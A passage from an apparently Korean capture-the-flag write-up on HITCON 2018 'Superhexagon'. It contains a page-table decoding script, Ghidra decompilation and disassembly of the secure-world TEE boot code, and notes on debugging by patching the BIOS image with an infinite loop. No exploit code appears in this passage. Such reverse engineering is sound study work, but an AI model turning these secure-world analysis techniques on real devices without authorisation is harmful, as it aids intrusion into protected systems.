</span></span><span style="display:flex;"><span>        elif AP <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>b01:
</span></span><span style="display:flex;"><span>            E <span style="color:#f92672">+=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>PL1 Read<span style="color:#f92672">/</span>Write PL0 Read<span style="color:#f92672">/</span>Write <span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>        elif AP <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>b10:
</span></span><span style="display:flex;"><span>            E <span style="color:#f92672">+=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>PL1 Read<span style="color:#f92672">-</span>Only PL0 No<span style="color:#f92672">-</span>Access <span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>        elif AP <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>b11:
</span></span><span style="display:flex;"><span>            E <span style="color:#f92672">+=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>PL1 Read<span style="color:#f92672">-</span>Only PL0 Read<span style="color:#f92672">-</span>Only <span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> E
</span></span><span style="display:flex;"><span>    PT <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">2</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        PT <span style="color:#f92672">+=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>XN <span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">3</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        PT <span style="color:#f92672">+=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>NS <span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j, line in <span style="color:#a6e22e">enumerate</span>(res)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        l <span style="color:#f92672">=</span> (line.<span style="color:#a6e22e">split</span>())
</span></span><span style="display:flex;"><span>        v0, v1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">int</span>(l[<span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>), <span style="color:#66d9ef">int</span>(l[<span style="color:#ae81ff">2</span>],<span style="color:#ae81ff">16</span>) 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> v0 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0</span>b11: <span style="color:#960050;background-color:#1e0010">#</span> exists
</span></span><span style="display:flex;"><span>            bits <span style="color:#f92672">=</span> (next_table_idx[idx] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">21</span>)
</span></span><span style="display:flex;"><span>            bits <span style="color:#f92672">|=</span> ((j<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">12</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">hex</span>(bits),<span style="color:#a6e22e">hex</span>(((v0<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">12</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">12</span>)<span style="color:#f92672">&amp;</span>(<span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">36</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)),PT,<span style="color:#a6e22e">f</span>(v0))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> v1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0</span>b11: 
</span></span><span style="display:flex;"><span>            bits <span style="color:#f92672">=</span> (next_table_idx[idx] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">21</span>)
</span></span><span style="display:flex;"><span>            bits <span style="color:#f92672">|=</span> ((j<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">12</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">hex</span>(bits),<span style="color:#a6e22e">hex</span>(((v1<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">12</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">12</span>)<span style="color:#f92672">&amp;</span>(<span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">36</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)),PT,<span style="color:#a6e22e">f</span>(v1))
</span></span></code></pre></div><p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/b917a25c82e957aba8851cb91e18edc5.png" alt=""  />

Exception vector tables를 포함한 text 부분이 PL1에서도 Read-Only 인 것을 보니 구현이 틀리지는 않았을 것 같다.</p>
<h2 id="reverse-engineering-s-el1">Reverse engineering S-EL1<a hidden class="anchor" aria-hidden="true" href="#reverse-engineering-s-el1">#</a></h2>
<p>VBAR은 0xe400000 이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_00001698</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  uint uVar1;
</span></span><span style="display:flex;"><span>  undefined4 in_cr0;
</span></span><span style="display:flex;"><span>  undefined4 in_cr2;
</span></span><span style="display:flex;"><span>  undefined4 in_cr8;
</span></span><span style="display:flex;"><span>  undefined4 in_cr10;
</span></span><span style="display:flex;"><span>  undefined4 in_cr12;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto2</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0</span>,DAT_00001798 <span style="color:#f92672">+</span> (<span style="color:#ae81ff">0x16a0</span> <span style="color:#f92672">-</span> DAT_000017a8),<span style="color:#ae81ff">0</span>,in_cr2);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto2</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,in_cr2);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xff440400</span>,in_cr10,in_cr2);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Translation_table_control</span>(<span style="color:#ae81ff">0x80802504</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Domain_Access_Control</span>(DAT_000017ac);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,DAT_000017b0,in_cr12,in_cr0);
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">coproc_movefrom_Control</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Control</span>(uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>(<span style="color:#ae81ff">0xf</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setSupervisorMode</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,DAT_000017b4,in_cr12,in_cr0);
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">coproc_movefrom_Coprocessor_Access_Control</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Coprocessor_Access_Control</span>(uVar1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7fffffff</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0xf00000</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>(<span style="color:#ae81ff">0xf</span>);
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">coprocessor_movefromRt</span>(<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">0</span>,in_cr8,in_cr0);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto</span>(<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">0</span>,uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x40000000</span>,in_cr8,in_cr0);
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">coproc_movefrom_Control</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Control</span>(uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x1804</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00000060</span>(uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x1804</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setSupervisorMode</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(DAT_000017bc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x44</span>) <span style="color:#f92672">=</span> DAT_000017c0;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setAbortMode</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setUndefinedMode</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">software_smc</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Do nothing block with infinite loop */</span>
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span>( true );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>이런 괴랄한 코드는 어떻게 읽는지 모르겠다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  <span style="color:#a6e22e">FUN_00001698</span> ()
</span></span><span style="display:flex;"><span>             undefined         r0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>                             FUN_00001698                                    XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     FUN_000014f4:<span style="color:#ae81ff">00001524</span> (c)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span><span style="color:#ae81ff">98</span> <span style="color:#ae81ff">0f</span>  a0  a0  e1    cpy        r10 ,pc
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span><span style="color:#ae81ff">9</span>c <span style="color:#ae81ff">04</span>  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">9f</span>  e5    ldr        r0,[DAT_000017a8 ]                               <span style="color:#f92672">=</span> A0160008h
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>a0 <span style="color:#ae81ff">00</span>  a0  <span style="color:#ae81ff">4</span>a  e0    sub        r10 ,r10 ,r0
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>a4 ec  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">9f</span>  e5    ldr        r0,[DAT_00001798 ]                               <span style="color:#f92672">=</span> <span style="color:#ae81ff">0040000</span><span style="color:#ae81ff">8</span>h
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>a8 <span style="color:#ae81ff">0</span>a  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  e0    add        r0,r0,r10
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>ac <span style="color:#ae81ff">00</span>  a0  a0  e3    mov        r10 ,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>b0 <span style="color:#ae81ff">02</span>  <span style="color:#ae81ff">0f</span>  <span style="color:#ae81ff">4</span>a  ec    mcrr       p15,<span style="color:#ae81ff">0x0</span> ,r0,r10 ,cr2
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>b4 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  a0  e3    mov        r0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>b8 <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">0f</span>  <span style="color:#ae81ff">4</span>a  ec    mcrr       p15,<span style="color:#ae81ff">0x1</span> ,r0,r10 ,cr2
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>bc ff  <span style="color:#ae81ff">04</span>  a0  e3    mov        r0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xff000000</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>c0 <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">07</span>  <span style="color:#ae81ff">80</span>  e3    orr        r0,r0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x440000</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>c4 <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">0</span>b  <span style="color:#ae81ff">80</span>  e3    orr        r0,r0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x400</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>c8 <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">0f</span>  <span style="color:#ae81ff">0</span>a  ee    mcr        p15,<span style="color:#ae81ff">0x0</span> ,r0,cr10 ,cr2 ,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>cc <span style="color:#ae81ff">02</span>  <span style="color:#ae81ff">01</span>  a0  e3    mov        r0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x80000000</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>d0 <span style="color:#ae81ff">04</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  e3    orr        r0,r0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>d4 <span style="color:#ae81ff">02</span>  <span style="color:#ae81ff">0</span>a  <span style="color:#ae81ff">80</span>  e3    orr        r0,r0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x2000</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>d8 <span style="color:#ae81ff">02</span>  <span style="color:#ae81ff">05</span>  <span style="color:#ae81ff">80</span>  e3    orr        r0,r0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x800000</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>dc <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">0</span>b  <span style="color:#ae81ff">80</span>  e3    orr        r0,r0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x400</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016e0</span> <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">0</span>c  <span style="color:#ae81ff">80</span>  e3    orr        r0,r0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016e4</span> <span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">0f</span>  <span style="color:#ae81ff">02</span>  ee    mcr        p15,<span style="color:#ae81ff">0x0</span> ,r0,cr2 ,cr0 ,<span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016e8</span> bc  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">9f</span>  e5    ldr        r0,[DAT_000017ac ]                               <span style="color:#f92672">=</span> <span style="color:#ae81ff">55555555</span>h
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016</span>ec <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">0f</span>  <span style="color:#ae81ff">03</span>  ee    mcr        p15,<span style="color:#ae81ff">0x0</span> ,r0,cr3 ,cr0 ,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000016f</span><span style="color:#ae81ff">0</span> ff  ff  ff  ea    b          LAB_000016f4
</span></span></code></pre></div><p>mcrr은 register 두 개를 쓰는거라 64-bit 시스템 레지스터에 쓴다고 한다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/4d97b376cb5b048f419e1c220f3abebf.png" alt=""  />

<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/179ec0a9aa2fb5fdb0c6325a71daad30.png" alt=""  />

이런식의 인코딩 차이가 있다.
드디어 CRm만 가지고 어떻게 표를 보는지 알게 되었다.</p>
<p>bios.bin을 FEFFFFEA로 패치해서 무한루프를 만들어서 원하는 곳을 디버깅할 수 있다.
Normal world에 대한 디버깅 능력을 상실했으니 무조건 secure world에서 멈춰야한다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/ace6c929cddcc14726be50b664d52ce9.png" alt=""  />

<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/bc5fe1f74ab941ea69bec2a4011b40aa.png" alt=""  />

<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/dfcec7f41fc8523ef2d70b8202a127b9.png" alt=""  />

디버거가 시스템 레지스터를 제대로 표현하지 못한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_0e401698</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  uint uVar1;
</span></span><span style="display:flex;"><span>  undefined4 in_cr0;
</span></span><span style="display:flex;"><span>  undefined4 in_cr2;
</span></span><span style="display:flex;"><span>  undefined4 in_cr8;
</span></span><span style="display:flex;"><span>  undefined4 in_cr10;
</span></span><span style="display:flex;"><span>  undefined4 in_cr12;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* TTBR0 */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto2</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0</span>,DAT_0e401798 <span style="color:#f92672">+</span> (<span style="color:#ae81ff">0xe4016a0</span> <span style="color:#f92672">-</span> DAT_0e4017a8),<span style="color:#ae81ff">0</span>,in_cr2);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* TTBR1 */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto2</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,in_cr2);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xff440400</span>,in_cr10,in_cr2);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* TTBCR */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Translation_table_control</span>(<span style="color:#ae81ff">0x80802504</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* DACR */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Domain_Access_Control</span>(DAT_0e4017ac);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* VBAR */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,LONG_0e4017b0,in_cr12,in_cr0);
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">coproc_movefrom_Control</span>();
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* enable mmu */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Control</span>(uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>(<span style="color:#ae81ff">0xf</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setSupervisorMode</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,DAT_0e4017b4,in_cr12,in_cr0);
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">coproc_movefrom_Coprocessor_Access_Control</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Coprocessor_Access_Control</span>(uVar1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7fffffff</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0xf00000</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>(<span style="color:#ae81ff">0xf</span>);
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">coprocessor_movefromRt</span>(<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">0</span>,in_cr8,in_cr0);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto</span>(<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">0</span>,uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x40000000</span>,in_cr8,in_cr0);
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">coproc_movefrom_Control</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Control</span>(uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x1804</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_0e400060</span>(uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x1804</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setSupervisorMode</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(DAT_0e4017bc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x44</span>) <span style="color:#f92672">=</span> DAT_0e4017c0;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setAbortMode</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setUndefinedMode</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">software_smc</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Do nothing block with infinite loop */</span>
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span>( true );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>천천히 보니 대충 어떤 행동을 하고 있는지 알 것 같다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/87532572428032bf14ca6270982aa914.png" alt=""  />

MMU를 키고 그냥 00으로 밀려있다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/7d6622457a7f27860ccf39a922d9cabc.png" alt=""  />

많이 따라갈 필요도 없이 손으로 해도 될 것같다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/2bbfb57af26557baa29be290ed5e6849.png" alt=""  />

구조도 별로 다른건 없어보인다.
VBAR는 VA 0x8000040 이지만, PA로 변환해보면 0xe400040이다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/4721170053930c04d3ba1d2683062b3c.png" alt=""  />

MMU가 한번 활성화되면 이후엔 디버깅이 안되고 그냥 알아서 넘어가버리기 때문에 MMU bit 활성화 이후를 디버깅할 수 없다.
그래서 vector table entry에 무한 루프 걸어놓고 마저 디버깅을 시도했다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/b028e6ec5300e84339303cb8ed0a2c88.png" alt=""  />

Prefetch Abort에 잡히는 걸 보니 예상대로 그냥 거기서 에러나서 뛰는 것 같다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/2afe6941fa997b6d5d55061db764467b.png" alt=""  />

Abort라서 그런지 mode도 Abort로 바뀐다.
cps로 다시 supervisor mode로 변경해서 마저 TEE os initialization을 수행한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">UndefinedFunction_0e40004c</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  uint uVar1;
</span></span><span style="display:flex;"><span>  undefined4 in_cr0;
</span></span><span style="display:flex;"><span>  undefined4 in_cr8;
</span></span><span style="display:flex;"><span>  undefined4 in_cr12;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setSupervisorMode</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto</span>(<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,DAT_0e4017b4,in_cr12,in_cr0);
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">coproc_movefrom_Coprocessor_Access_Control</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Coprocessor_Access_Control</span>(uVar1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7fffffff</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0xf00000</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>(<span style="color:#ae81ff">0xf</span>);
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">coprocessor_movefromRt</span>(<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">0</span>,in_cr8,in_cr0);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coprocessor_moveto</span>(<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">0</span>,uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x40000000</span>,in_cr8,in_cr0);
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">coproc_movefrom_Control</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">coproc_moveto_Control</span>(uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x1804</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_0e400060</span>(uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x1804</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setSupervisorMode</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(DAT_0e4017bc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x44</span>) <span style="color:#f92672">=</span> DAT_0e4017c0;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setAbortMode</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setUndefinedMode</span>();
